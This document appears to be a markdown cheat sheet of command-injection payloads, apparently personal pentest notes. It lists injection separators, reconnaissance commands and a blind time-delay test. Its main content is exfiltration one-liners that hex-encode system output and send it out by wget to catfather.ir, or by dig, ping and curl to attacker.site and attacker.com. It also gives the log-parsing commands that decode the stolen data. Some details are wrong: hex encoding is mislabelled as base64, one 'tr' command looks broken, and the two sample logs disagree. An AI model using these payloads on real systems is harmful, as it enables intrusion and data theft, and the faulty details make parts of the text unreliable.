# CI ( Command Injection )

CI is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application

## ****Ways of injecting OS commands****

```bash
&
&&
|
||
;
%0a
0x0a
\n
`command`
${command}
```

[more]([https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection))

## Useful Command

- UNIX

```bash
whoami
id
uname -a
ifconfig
netstat -n
ps -ef
```

- windows

```bash
whoami
ver
ipconfig /all
netstat -n
tasklist
```

## ****Blind OS command injection vulnerabilities****

In blind mode the application does not return the output from the command within its HTTP response.

- Detecting by time delay

```bash
& ping -c 10 127.0.0.1 &
```

## Exfilteration Data

Given we don’t have space and other specific characters in subdomain, we encode the our data and append it to our url then send it by DNS query or other ways.

- Payload:
- `od` encode data to base64

```bash
uname -a | od -A n -t x1 | sed 's/ *//g' | while read x; do wget -q --spider catfather.ir/$x -U "$(whoami)";done
```

- Apache log

First we can tail -f /var/log/apache2/access.log and extract the whoami then following command:

```bash
> awk '/mrcat/' /var/log/apache2/access.log
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:37 +0400] "HEAD /4a696e75782063617446617468657220 HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:38 +0400] "HEAD /352e31382e31362d61726368312d3120 HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:38 +0400] "HEAD /233120534d5020505245454d50545f44 HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:39 +0400] "HEAD /524e414d4943205765642c2030332041 HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:40 +0400] "HEAD /756720323032322031313a32353a3034 HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:43 +0400] "HEAD /262b30303030207838365f363420474e HTTP/1.1" 404 196 "-" "mrcat"
xxx.xxx.xxx.xxx - - [22/Nov/2022:12:51:43 +0400] "HEAD /532f4c696e75780a HTTP/1.1" 404 196 "-" "mrcat"

```

- Extract data and decode
- `xxd` decode base64
- `tr` delete newline

```bash
awk '/mrcat/' /var/log/apache2/access.log | awk 'match($0, /HEAD\s\/(.*)\sHTTP/) {print substr($0, RSTART+6, RLENGTH-11)}' | tr -d '\n' | xxd -r -p
```

Another Example

- Payload

```bash
uname -a | od -A n -t x1 | sed 's/ *//g' | while read x; do wget -q --spider catfather.ir/$(whoami) -U "$x";done
```

- Apache log

```bash
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:20 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "-"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:20 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "-"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:21 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "-"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:27 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "4a696e75782063617446617468657220"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:28 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "3b2e31382e31362d61726368312d3120"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:36 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "2a3120534d5020505245454d50545f44"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:37 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "5d4e414d4943205765642c2030332041"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:37 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "7b6720323032322031313a32353a3034"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:38 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "2a2b30303030207838365f363420474e"
xxx.xxx.xxx.xxx - - [22/Nov/2022:13:47:39 +0400] "HEAD /mrcat HTTP/1.1" 404 196 "-" "5a2f4c696e75780a"
```

- Extract & decode

```bash
awk -F '"' '/\/mrcat/ {print $6}' /var/log/apache2/access.log | awk '! /-/' | tr -d n | xxd -r -p
```

Also we can send data via:

- dig a encode.attacker.site
- ping -c 1 encode.attacker.site
- curl [attacker.site](http://attacker.site) -A "echode-data"


- Use Encoder and fold.

```bash
id|base64|fold -10|while read x;do ping -c 1 $x.attacker.com ;done
```
